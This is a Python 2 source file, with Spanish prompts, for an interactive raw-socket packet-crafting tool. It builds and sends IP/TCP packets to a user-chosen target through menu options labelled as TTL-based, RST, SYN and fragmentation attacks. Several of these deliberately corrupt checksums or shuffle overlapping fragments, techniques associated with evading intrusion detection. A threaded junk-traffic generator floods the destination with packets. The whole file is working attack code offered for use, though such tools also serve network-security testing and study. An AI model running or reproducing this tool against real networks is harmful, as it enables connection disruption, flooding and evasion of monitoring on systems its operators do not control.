import socket, sys, threading, time
import netifaces as ni
from random import randrange
from struct import *


class HiloProduccionTrafico(threading.Thread):

    def __init__(self, cabeceraIP, cabeceraTCP, direccionOrigen, direccionDestino, datos, numeroPaquetes):
        super(HiloProduccionTrafico, self).__init__()
        # for i in range(len(cabeceraIP)):
        #     print cabeceraIP[i]
        #
        # for i in range(len(cabeceraTCP)):
        #     print cabeceraTCP[i]
        # print direccionOrigen
        # print direccionDestino
        # print datos
        try:
            self.socketEnvio = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except socket.error , msg:
            print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
            sys.exit()

        cabeceraIP[8] = socket.inet_aton(cabeceraIP[8])
        cabeceraIP[9] = socket.inet_aton(cabeceraIP[9])

        cabeceraTCP[6] = socket.htons(5840)
        self.puertoDestino = cabeceraTCP[1]
        self.listaPaquetes = list()
        for i in range(0, numeroPaquetes):
            cabeceraIPEmpaquetada = pack('!BBHHHBBH4s4s' , cabeceraIP[0], cabeceraIP[1], cabeceraIP[2], cabeceraIP[3] + i, cabeceraIP[4],
                                         cabeceraIP[5], cabeceraIP[6], cabeceraIP[7], cabeceraIP[8], cabeceraIP[9])
            cabeceraTCPEmpaquetada = pack('!HHLLBBHHH', cabeceraTCP[0], cabeceraTCP[1], cabeceraTCP[2] + i, cabeceraTCP[3] + i, cabeceraTCP[4],
                                          cabeceraTCP[5], cabeceraTCP[6], cabeceraTCP[7], cabeceraTCP[8])
            self.direccionDestino = direccionDestino
            self.numeroPaquetes = numeroPaquetes

            pseudoHeader = pack('!4s4sBBH', socket.inet_aton(direccionOrigen), socket.inet_aton(direccionDestino), 0, cabeceraIP[6], len(cabeceraTCPEmpaquetada) + len(datos))
            pseudoHeader = pseudoHeader + cabeceraTCPEmpaquetada + datos

            tcpChecksum = self.checksum(pseudoHeader)
            cabeceraTCPFinal = pack('!HHLLBBH', int(cabeceraTCP[0]), int(cabeceraTCP[1]), int(cabeceraTCP[2]) + i, int(cabeceraTCP[3]) + i, int(cabeceraTCP[4]),
                             int(cabeceraTCP[5]), int(cabeceraTCP[6])) + pack('H', tcpChecksum) + pack('!H', 0)

            packet = cabeceraIPEmpaquetada + cabeceraTCPFinal + datos
            self.listaPaquetes.append(packet)
        self.salir = False

    def checksum(self, msg):
        checksumCalculate = 0

        # loop taking 2 characters at a time
        for i in range(0, len(msg), 2):
            firtsCharacter = ord(msg[i])
            try:
                secondCharacter = ord(msg[i + 1])
            except IndexError:
                secondCharacter = 0
            w = firtsCharacter + (secondCharacter << 8 )
            checksumCalculate += w

        checksumCalculate = (checksumCalculate >> 16) + (checksumCalculate & 0xffff);
        checksumCalculate = checksumCalculate + (checksumCalculate >> 16);

        #complement and mask to 4 byte short
        checksumCalculate = ~checksumCalculate & 0xffff

        return checksumCalculate

    def run(self):
        paquetesEnviados = 0
        while self.salir == False or self.paquetesEnviados < len(self.listaPaquetes):
            time.sleep(0.001)
            print "Paquete enviado numero: " + str(paquetesEnviados)
            self.socketEnvio.sendto(self.listaPaquetes[paquetesEnviados], (self.direccionDestino, self.puertoDestino))
            paquetesEnviados += 1

        print "Evnio terminado"
        self.socketEnvio.close()

def checksum(msg):
    checksumCalculate = 0

    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        firtsCharacter = ord(msg[i])
        try:
            secondCharacter = ord(msg[i + 1])
        except IndexError:
            secondCharacter = 0
        w = firtsCharacter + (secondCharacter << 8 )
        checksumCalculate += w

    checksumCalculate = (checksumCalculate >> 16) + (checksumCalculate & 0xffff);
    checksumCalculate = checksumCalculate + (checksumCalculate >> 16);

    #complement and mask to 4 byte short
    checksumCalculate = ~checksumCalculate & 0xffff

    return checksumCalculate

def configuracionPaqueteCompleta(miIP):
    try:
        socketToSendData = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # IP Header
    listFieldIPHeader = ["version", "Type of service(TOS)", "Identification", "Flags IP", "Fragment Offset", "Time to live",
                         "Protocol", "Destination Address"]
    ipHeaderList = list()
    print "if you don't choose any element, you will insert 0 "
    for i in range(len(listFieldIPHeader)):
        ipHeaderList.append(raw_input("Enter element " + listFieldIPHeader[i] + " of IP header: "))

    if ipHeaderList[6].lower() == "tcp" or ipHeaderList[6] == "6":
        ipHeaderList[6] = socket.IPPROTO_TCP
    elif ipHeaderList[6].lower() == "icmp" or ipHeaderList[6] == "1":
        ipHeaderList[6] = socket.IPPROTO_ICMP
    elif ipHeaderList[6].lower() == "udp" or ipHeaderList[6] == "17":
        ipHeaderList[6] = socket.IPPROTO_UDP
    else:
        ipHeaderList[6] = socket.IPPROTO_TCP
    # ipHeaderList[6] = socket.IPPROTO_TCP

    ipHeader = pack('!BBHHHBBH4s4s' , (int(ipHeaderList[0]) << 4) + 5, int(ipHeaderList[1]), 0, int(ipHeaderList[2]),
                    (int(ipHeaderList[3]) << 13) + int(ipHeaderList[4]), int(ipHeaderList[5]), ipHeaderList[6], 0,
                    socket.inet_aton(miIP), socket.inet_aton(ipHeaderList[8]))
    # print "ip header: " + str(ipHeader)

    # TCP header
    listFieldTCPHeader = ["Source Port", "Destination Port", "Sequence number", "Ack number", "Flag fin", "Flag SYN",
                          "Flag RST", "Flag PSH", "Flag ACK", "Flag URG"]
    tcpHeaderList = list()
    print "if you don't choose any element, you will insert 0 "
    for i in range(len(listFieldTCPHeader)):
        tcpHeaderList.append(raw_input("Enter element " + listFieldTCPHeader[i] + " of TCP header: "))

    tcpOffSetReserved = (5 << 4) + 0
    tcpFlags = int(tcpHeaderList[4]) + (int(tcpHeaderList[5]) << 1) + (int(tcpHeaderList[6]) << 2) + (int(tcpHeaderList[7]) << 3) + \
               (int(tcpHeaderList[8]) << 4) + (int(tcpHeaderList[9]) << 5)
    tcpWindow = socket.htons(5840)

    tcpHeader = pack('!HHLLBBHHH', int(tcpHeaderList[0]), int(tcpHeaderList[1]), int(tcpHeaderList[2]), int(tcpHeaderList[3]), tcpOffSetReserved,
                     tcpFlags, tcpWindow, 0, 0)

    dataToSend = raw_input("Insert data: ")
    # now calculate pseudoHeader
    pseudoHeader = pack('!4s4sBBH', socket.inet_aton(miIP), socket.inet_aton(ipHeaderList[8]), 0, ipHeaderList[6], len(tcpHeader) + len(dataToSend))
    pseudoHeader = pseudoHeader + tcpHeader + dataToSend

    tcpChecksum = checksum(pseudoHeader)
    tcpHeader = pack('!HHLLBBH', int(tcpHeaderList[0]), int(tcpHeaderList[1]), int(tcpHeaderList[2]), int(tcpHeaderList[3]), tcpOffSetReserved,
                     tcpFlags, tcpWindow) + pack('H', tcpChecksum) + pack('!H', 0)

    packet = ipHeader + tcpHeader + dataToSend
    socketToSendData.sendto(packet, (ipHeaderList[8], 0))
    print "enviado el ataque"

def ataqueTTL(miIP):
    print "Configuracion del ataque basado en TTL"
    try:
        socketDeEnvio = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # IP Header
    listaCampoCabecera = ["Identificacion", "Time to live", "Direccion destino"]
    listaElementosIP = list()
    for i in range(len(listaCampoCabecera)):
        var = ""
        while var == "":
            var = raw_input("Introduce el elemento " + listaCampoCabecera[i] + " de la cabecera IP: ")
        listaElementosIP.append(var)
    cabeceraIP = pack('!BBHHHBBH4s4s' , (4 << 4) + 5, 0, 0, int(listaElementosIP[0]),
                    0, int(listaElementosIP[1]), socket.IPPROTO_TCP, 0,
                    socket.inet_aton(miIP), socket.inet_aton(listaElementosIP[2]))

    # cabecera TCP
    listaCampoCabecera = ["Puerto de origen", "Puerto de destino"]
    listaElementosTCP = list()
    for i in range(len(listaCampoCabecera)):
        var = ""
        while var == "":
            var = raw_input("Introduce el elemento " + listaCampoCabecera[i] + " de la cabecera TCP: ")
        listaElementosTCP.append(var)
    tcpOffSetReserved = (5 << 4) + 0
    tcpWindow = socket.htons(5840)
    cabeceraTCP = pack('!HHLLBBHHH', int(listaElementosTCP[0]), int(listaElementosTCP[1]), 500, 300, tcpOffSetReserved,
                     0, tcpWindow, 0, 0)
    # Datos
    datos = raw_input("Introduce los datos: ")
    # now calculate pseudoHeader
    pseudoHeader = pack('!4s4sBBH', socket.inet_aton(miIP), socket.inet_aton(listaElementosIP[2]), 0, socket.IPPROTO_TCP, len(cabeceraTCP) + len(datos))
    pseudoHeader = pseudoHeader + cabeceraTCP + datos
    print pseudoHeader
    tcpChecksum = checksum(pseudoHeader)
    cabeceraTCP = pack('!HHLLBBH', int(listaElementosTCP[0]), int(listaElementosTCP[1]), 500, 300, tcpOffSetReserved,
                     0, tcpWindow) + pack('H', tcpChecksum) + pack('!H', 0)

    paquete = cabeceraIP + cabeceraTCP + datos

    lanzar = False
    while lanzar == False:
        cadena = raw_input('Quiere lanzar el ataque? Introduzca "si" para lanzarlo ')
        try:
            cadena = cadena.lower()
        except TypeError:
            print 'por favor introduzca "si" si quiere lanzar el ataque'
        if cadena == "si":
            lanzar = True
    socketDeEnvio.sendto(paquete, (listaElementosIP[2], int(listaElementosTCP[1])))
    print "enviado ataque TTL"

def ataqueRST(miIP):
    print "Configuracion del ataque basado en RST"
    try:
        socketDeEnvio = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # IP Header
    listaCampoCabecera = ["Identificacion", "Time to live", "Direccion destino"]
    listaElementosIP = list()
    for i in range(len(listaCampoCabecera)):
        var = ""
        while var == "":
            var = raw_input("Introduce el elemento " + listaCampoCabecera[i] + " de la cabecera IP: ")
        listaElementosIP.append(var)
    cabeceraIP = pack('!BBHHHBBH4s4s' , (4 << 4) + 5, 0, 0, int(listaElementosIP[0]),
                    0, int(listaElementosIP[1]), 6, 0,
                    socket.inet_aton(miIP), socket.inet_aton(listaElementosIP[2]))

    # cabecera TCP
    listaCampoCabecera = ["Puerto de origen", "Puerto de destino"]
    listaElementosTCP = list()
    for i in range(len(listaCampoCabecera)):
        var = ""
        while var == "":
            var = raw_input("Introduce el elemento " + listaCampoCabecera[i] + " de la cabecera TCP: ")
        listaElementosTCP.append(var)
    tcpOffSetReserved = (5 << 4) + 0
    # TCP flags
    tcpFin = 0
    tcpSyn = 0
    tcpRst = 1
    tcpPsh = 0
    tcpAck = 0
    tcpUrg = 0
    tcpFlags = tcpFin + (tcpSyn << 1) + (tcpRst << 2) + (tcpPsh <<3) + (tcpAck << 4) + (tcpUrg << 5)
    tcpWindow = socket.htons(5840)
    cabeceraTCP = pack('!HHLLBBHHH', int(listaElementosTCP[0]), int(listaElementosTCP[1]), 500, 300, tcpOffSetReserved,
                     tcpFlags, tcpWindow, 0, 0)
    # Datos
    datos = raw_input("Introduce los datos: ")

    # now calculate pseudoHeader
    pseudoHeader = pack('!4s4sBBH', socket.inet_aton(miIP), socket.inet_aton(listaElementosIP[2]), 0, 6, len(cabeceraTCP) + len(datos))
    pseudoHeader = pseudoHeader + cabeceraTCP + datos

    tcpChecksum = checksum(pseudoHeader) + 1
    cabeceraTCP = pack('!HHLLBBH', int(listaElementosTCP[0]), int(listaElementosTCP[1]), 500, 300, tcpOffSetReserved,
                     tcpFlags, tcpWindow) + pack('H', tcpChecksum) + pack('!H', 0)

    paquete = cabeceraIP + cabeceraTCP + datos

    lanzar = False
    while lanzar == False:
        cadena = raw_input('Quiere lanzar el ataque? Introduzca "si" para lanzarlo ')
        try:
            cadena = cadena.lower()
        except TypeError:
            print 'por favor introduzca "si" si quiere lanzar el ataque'
        if cadena == "si":
            lanzar = True
    socketDeEnvio.sendto(paquete, (listaElementosIP[2], int(listaElementosTCP[1])))
    print "enviado ataque RST"

def ataqueSYN(miIP):
    print "Configuracion del ataque basado en SYN"
    try:
        socketDeEnvio = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # IP Header
    listaCampoCabecera = ["Identificacion", "Time to live", "Direccion destino"]
    listaElementosIP = list()
    for i in range(len(listaCampoCabecera)):
        var = ""
        while var == "":
            var = raw_input("Introduce el elemento " + listaCampoCabecera[i] + " de la cabecera IP: ")
        listaElementosIP.append(var)
    cabeceraIP = pack('!BBHHHBBH4s4s' , (4 << 4) + 5, 0, 0, int(listaElementosIP[0]),
                    0, int(listaElementosIP[1]), socket.IPPROTO_TCP, 0,
                    socket.inet_aton(miIP), socket.inet_aton(listaElementosIP[2]))

    # cabecera TCP
    listaCampoCabecera = ["Puerto de origen", "Puerto de destino"]
    listaElementosTCP = list()
    for i in range(len(listaCampoCabecera)):
        var = ""
        while var == "":
            var = raw_input("Introduce el elemento " + listaCampoCabecera[i] + " de la cabecera TCP: ")
        listaElementosTCP.append(var)
    tcpOffSetReserved = (5 << 4) + 0
    # TCP flags
    tcpFin = 0
    tcpSyn = 1
    tcpRst = 0
    tcpPsh = 0
    tcpAck = 0
    tcpUrg = 0
    tcpFlags = tcpFin + (tcpSyn << 1) + (tcpRst << 2) + (tcpPsh <<3) + (tcpAck << 4) + (tcpUrg << 5)
    tcpWindow = socket.htons(5840)
    cabeceraTCP = pack('!HHLLBBHHH', int(listaElementosTCP[0]), int(listaElementosTCP[1]), 500, 300, tcpOffSetReserved,
                     tcpFlags, tcpWindow, 0, 0)
    # Datos
    datos = raw_input("Introduce los datos: ")

    # now calculate pseudoHeader
    pseudoHeader = pack('!4s4sBBH', socket.inet_aton(miIP), socket.inet_aton(listaElementosIP[2]), 0, socket.IPPROTO_TCP, len(cabeceraTCP) + len(datos))
    pseudoHeader = pseudoHeader + cabeceraTCP + datos

    tcpChecksum = checksum(pseudoHeader) + 1
    cabeceraTCP = pack('!HHLLBBH', int(listaElementosTCP[0]), int(listaElementosTCP[1]), 500, 300, tcpOffSetReserved,
                     tcpFlags, tcpWindow) + pack('H', tcpChecksum) + pack('!H', 0)

    paquete = cabeceraIP + cabeceraTCP + datos
    lanzar = False
    while lanzar == False:
        cadena = raw_input('Quiere lanzar el ataque? Introduzca "si" para lanzarlo ')
        try:
            cadena = cadena.lower()
        except TypeError:
            print 'por favor introduzca "si" si quiere lanzar el ataque'
        if cadena == "si":
            lanzar = True
    socketDeEnvio.sendto(paquete, (listaElementosIP[2], int(listaElementosTCP[1])))
    print "enviado ataque SYN"

def ataqueFragmentation(miIP):
    print "Configuracion del ataque de fragmentacion"
    try:
        socketDeEnvio = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    numeroPaquetesAtaque = 0
    while numeroPaquetesAtaque == 0:
        try:
            numeroPaquetesAtaque = int(raw_input("Introduce el numero de paquetes de este ataque: "))
        except ValueError:
            print "Por favor introduzca un numero"
            numeroPaquetesAtaque = 0

    #  configuracion de los paquetes esto no cambia es comun para todos los paquetes fragmentados
    #  cabeceraIP
    print "Configuracion comun de los paquetes"
    listaCampoCabecera = ["Identificacion", "Time to live", "Direccion destino"]
    listaElementosIP = list()
    for i in range(len(listaCampoCabecera)):
        var = ""
        while var == "":
            var = raw_input("Introduce el elemento " + listaCampoCabecera[i] + " de la cabecera IP: ")
        listaElementosIP.append(var)
    cabeceraIP = [(4 << 4) + 5, 0, 0, int(listaElementosIP[0]), 0, int(listaElementosIP[1]), 6, 0,
                  miIP, listaElementosIP[2]]
    #  cabeceraTCP
    listaCampoCabecera = ["Puerto de origen", "Puerto de destino", "Numero de sequencia", "Numero ACK"]
    listaElementosTCP = list()
    for i in range(len(listaCampoCabecera)):
        var = ""
        while var == "":
            var = raw_input("Introduce el elemento " + listaCampoCabecera[i] + " de la cabecera TCP: ")
        listaElementosTCP.append(var)
    tcpOffSetReserved = (5 << 4) + 0
    # TCP flags
    tcpFin = 0
    tcpSyn = 0
    tcpRst = 0
    tcpPsh = 0
    tcpAck = 0
    tcpUrg = 0
    tcpFlags = tcpFin + (tcpSyn << 1) + (tcpRst << 2) + (tcpPsh <<3) + (tcpAck << 4) + (tcpUrg << 5)
    tcpWindow = socket.htons(5840)
    cabeceraTCP = [int(listaElementosTCP[0]), int(listaElementosTCP[1]), int(listaElementosTCP[2]), int(listaElementosTCP[3]),
                   tcpOffSetReserved, tcpFlags, tcpWindow, 0, 0]

    sizePaqueteAnterior = 0
    # configuracion expresa de los campos que cambian en los paquetes
    listaPaquetes = list()
    for j in range(0, numeroPaquetesAtaque):
        print "Configuracion del paquete " + str(j + 1)
        # IP Header
        listaCampoCabecera = ["flags fragmentation", "offset"]
        listaElementosIP = list()
        if sizePaqueteAnterior != 0:
            print "El size del paquete anterior es(en bloques de 64 bits): " + str(sizePaqueteAnterior)
        for i in range(len(listaCampoCabecera)):
            var = ""
            while var == "":
                var = raw_input("Introduce el elemento " + listaCampoCabecera[i] + " de la cabecera IP del paquete " + str(j + 1) + ": ")
            listaElementosIP.append(var)
        fragmentationIP = (int(listaElementosIP[0]) << 13) + int(listaElementosIP[1])
        cabeceraIPEmpaquetada = pack('!BBHHHBBH4s4s' , cabeceraIP[0], cabeceraIP[1], cabeceraIP[2], cabeceraIP[3],
                                     fragmentationIP, cabeceraIP[5], cabeceraIP[6], cabeceraIP[7],
                                     socket.inet_aton(cabeceraIP[8]), socket.inet_aton(cabeceraIP[9]))

        # cabecera TCP
        cabeceraTCPEmpaquetada = pack('!HHLLBBHHH', cabeceraTCP[0], cabeceraTCP[1], cabeceraTCP[2], cabeceraTCP[3],cabeceraTCP[4],
                                      cabeceraTCP[5], cabeceraTCP[6], cabeceraTCP[7], cabeceraTCP[8])
        # Datos
        datos = raw_input("Introduce los datos del paquete " + str(j + 1) + ": ")
        sizeDatos = len(datos.encode("hex")) * 8
        sizePaqueteAnterior = sizeDatos / 64
        if (sizeDatos % 64) != 0:
            sizePaqueteAnterior += 1


        # now calculate pseudoHeader
        pseudoHeader = pack('!4s4sBBH', socket.inet_aton(miIP), socket.inet_aton(cabeceraIP[9]), 0, cabeceraIP[6], len(cabeceraTCPEmpaquetada) + len(datos))
        pseudoHeader = pseudoHeader + cabeceraTCPEmpaquetada + datos

        tcpChecksum = checksum(pseudoHeader) + 1
        cabeceraTCPEmpaquetada = pack('!HHLLBBH', cabeceraTCP[0], cabeceraTCP[1], cabeceraTCP[2], cabeceraTCP[3], cabeceraTCP[4],
                                      cabeceraTCP[5], cabeceraTCP[6]) + pack('H', tcpChecksum) + pack('!H', cabeceraTCP[8])

        paquete = cabeceraIPEmpaquetada + cabeceraTCPEmpaquetada + datos
        listaPaquetes.append(paquete)

    # desordenando la lista de los paquetes
    i = len(listaPaquetes)
    while i > 1:
        i = i - 1
        j = randrange(i)  # 0 < = j <= i-1
        listaPaquetes[j], listaPaquetes[i] = listaPaquetes[i], listaPaquetes[j]

    lanzar = False
    while lanzar == False:
        cadena = raw_input('Quiere lanzar el ataque? Introduzca "si" para lanzarlo ')
        try:
            cadena = cadena.lower()
        except TypeError:
            print 'por favor introduzca "si" si quiere lanzar el ataque'
        if cadena == "si":
            lanzar = True
    for i in range(len(listaPaquetes)):
        print listaPaquetes[i]
        socketDeEnvio.sendto(listaPaquetes[i], (cabeceraIP[9], int(listaElementosTCP[1])))

def configCabecera(cabecera):
    if cabecera == 0:
        listaCamposCabecera = ["version", "identificador del paquete", "Time to live", "Protocolo", "Direccion destino"]
        cabecera = "IP"
    else:
        listaCamposCabecera = ["Puerto origen", "Puerto destino"]
        cabecera = "TCP"
    listaCabecera = list()
    print "Configuracion de la cabecera " + cabecera
    for i in range(len(listaCamposCabecera)):
        var = ""
        while var == "":
            var = raw_input("Introduce el elemento " + listaCamposCabecera[i] + " de la cabecera " + cabecera + ": ")
        listaCabecera.append(var)
    return listaCabecera

def menu():
    enviarEleccion = False
    while enviarEleccion == False:
        print ""
        print "------Menu------"
        print "1. Numero de hilos de produccion de trafico"
        print "2. Configuracion del paquete de ataque"
        print "3. Salir"
        try:
            seleccion = int(raw_input("Introduce la opcion elegida: "))
            enviarEleccion = True
        except ValueError:
            print "Por favor introduzca un numero"
            enviarEleccion = False
    return seleccion

def menuHilosTrafico():
    enviarEleccion = False
    while enviarEleccion == False:
        print ""
        print "------Menu de los hilos de generacion de trafico------"
        print "1. Configuracion de los hilos"
        print "2. Lanzar"
        print "3. Salir"
        try:
            seleccion = int(raw_input("Introduce la opcion elegida: "))
            enviarEleccion = True
        except ValueError:
            print "Por favor introduzca un numero"
            enviarEleccion = False
    return seleccion

def menuConfiguracionAtaque():
    enviarEleccion = False
    while enviarEleccion == False:
        print ""
        print "------Menu de configuracion de ataque------"
        print "1. Ataque basado en TTL"
        print "2. Ataque basado en RST"
        print "3. Ataque basado en SYN"
        print "4. Ataque de fragmentacion"
        print "5. Configurar todo el paquete para atacar"
        print "6. Salir"
        try:
            seleccion = int(raw_input("Introduce la opcion elegida: "))
            enviarEleccion = True
        except ValueError:
            print "Por favor introduzca un numero"
            enviarEleccion = False
    return seleccion

if __name__ == "__main__":
    servicioSeleccionado = ""
    while servicioSeleccionado == "":
        servicioSeleccionado = raw_input("Introduce el servicio de red que quiera utilizar: ")
    ni.ifaddresses(servicioSeleccionado)
    miIP = ni.ifaddresses(servicioSeleccionado)[2][0]['addr']

    # ni.ifaddresses('wlan0')
    # miIP = ni.ifaddresses('wlan0')[2][0]['addr']

    salir = False
    listaHilosBasura = list()
    while salir == False:
        seleccion = menu()
        if seleccion == 1:
            seleccionHilosTrafico = 0
            while seleccionHilosTrafico != 3:
                seleccionHilosTrafico = menuHilosTrafico()
                # configuramos el paquete para los distintos hilos
                if seleccionHilosTrafico == 1:
                    numeroHiloTrafico = 0
                    while numeroHiloTrafico == 0:
                        try:
                            numeroHiloTrafico = int(raw_input("Introducce el numero de hilos que lanzan trafico basura: "))
                        except ValueError:
                            print "Por favor introduce un numero"
                            numeroHiloTrafico = 0
                    print ""
                    print "Procedemos a configurar el paquete"
                    for i in range(0, numeroHiloTrafico):
                        print ""
                        print "Configuracion del paquete del hilo: " + str(i + 1)
                        # Cabecera IP
                        listaElementosIP = configCabecera(0)
                        if listaElementosIP[3].lower() == "tcp" or listaElementosIP[3] == 6:
                            listaElementosIP[3] = socket.IPPROTO_TCP
                        elif listaElementosIP[3].lower() == "icmp" or listaElementosIP[3] == 1:
                            listaElementosIP[3] = socket.IPPROTO_ICMP
                        elif listaElementosIP[3].lower() == "udp" or listaElementosIP[3] == 17:
                            listaElementosIP[3] = socket.IPPROTO_UDP
                        else:
                            listaElementosIP[3] = socket.IPPROTO_TCP

                        cabeceraIP = [(int(listaElementosIP[0]) << 4) + 5, 0, 0, int(listaElementosIP[1]), (0 << 13) + 0, int(listaElementosIP[2]), listaElementosIP[3], 0,
                                        miIP, listaElementosIP[4]]
                        listaElementosTCP = configCabecera(1)
                        tcpFlags = 0 + (0 << 1) + (0 << 2) + (0 << 3) + (0 << 4) + (0 << 5)
                        cabeceraTCP = [int(listaElementosTCP[0]), int(listaElementosTCP[1]), 500, 300, (5 << 4) + 0, tcpFlags, 0, 0, 0]
                        datos = raw_input("Inserta los datos a enviar: ")
                        numeroPaquetes = 0
                        while numeroPaquetes == 0:
                            try:
                                numeroPaquetes = int(raw_input("Numero de paquetes a enviar: "))
                            except ValueError:
                                print "Por favor introduce un numero"
                                numeroPaquetes = 0
                        hilo = HiloProduccionTrafico(cabeceraIP, cabeceraTCP, miIP, listaElementosIP[4], datos, numeroPaquetes)
                        hilo.setDaemon(True)
                        lanzar = False
                        listaHilosBasura.append(hilo)
                elif seleccionHilosTrafico == 2:
                    if len(listaHilosBasura) == 0:
                        # cabeceraIP = [(4 << 4) + 5, 0, 0, 486, 0, 5, socket.IPPROTO_TCP, 0,
                        #               socket.inet_aton(miIP), socket.inet_aton('8.8.8.8')]
                        # tcpFlags = 0 + (0 << 1) + (0 << 2) + (0 << 3) + (0 << 4) + (0 << 5)
                        # cabeceraTCP = [5007, 80, 500, 300, (5 << 4) + 0, tcpFlags, socket.htons(5840), 0, 0]
                        # datos = 'Esto es un mensje de prueba'
                        # hilo = HiloProduccionTrafico(cabeceraIP, cabeceraTCP, miIP, '8.8.8.8', datos, 1000)
                        # hilo.setDaemon(True)
                        # hilo.start()
                        print "Po favor configure el paquete y luego pulse en lanzar"
                    else:
                        while lanzar == False:
                            cadena = raw_input('Quiere lanzar el ataque? Introduzca "si" para lanzarlo ')
                            try:
                                cadena = cadena.lower()
                            except TypeError:
                                print 'por favor introduzca "si" si quiere lanzar el ataque'
                            if cadena == "si":
                                lanzar = True
                        for i in range(0, len(listaHilosBasura)):
                            listaHilosBasura[i].start()
        elif seleccion == 2:
            seleccionAtaque = 0
            while seleccionAtaque != 6:
                seleccionAtaque = menuConfiguracionAtaque()
                if seleccionAtaque == 1:
                    ataqueTTL(miIP)
                elif seleccionAtaque == 2:
                    ataqueRST(miIP)
                elif seleccionAtaque == 3:
                    ataqueSYN(miIP)
                elif seleccionAtaque == 4:
                    ataqueFragmentation(miIP)
                elif seleccionAtaque == 5:
                    configuracionPaqueteCompleta(miIP)
        elif seleccion == 3:
            salir = True


# packet = listaPaquetes[0]
# ipHeader = packet[0:20]
# #now unpack them :)
# iph = unpack('!BBHHHBBH4s4s' , ipHeader)
# versionIhl = iph[0]
# version = versionIhl >> 4
# ihl = versionIhl & 0xF
# iphLength = ihl * 4
# flagsFragment = iph[4] & 0xE000 >> 13
# positionFragment = ((iph[4] | 0xE000) ^ 0xE000) * 64
# print iph
# print flagsFragment
# print ((iph[4] | 0xE000) ^ 0xE000)
# print positionFragment
# t = iphLength
# tcpHeader = packet[t:t+20]
# #now unpack them :)
# tcph = unpack('!HHLLBBHHH' , tcpHeader)
# print tcph
#
#
# packet = listaPaquetes[1]
# ipHeader = packet[0:20]
# #now unpack them :)
# iph = unpack('!BBHHHBBH4s4s' , ipHeader)
# versionIhl = iph[0]
# version = versionIhl >> 4
# ihl = versionIhl & 0xF
# iphLength = ihl * 4
# flagsFragment = iph[4] & 0xE000 >> 13
# positionFragment = ((iph[4] | 0xE000) ^ 0xE000) * 64
# print iph
# print flagsFragment
# print ((iph[4] | 0xE000) ^ 0xE000)
# print positionFragment
# t = iphLength
# tcpHeader = packet[t:t+20]
# #now unpack them :)
# tcph = unpack('!HHLLBBHHH' , tcpHeader)
# print tcph
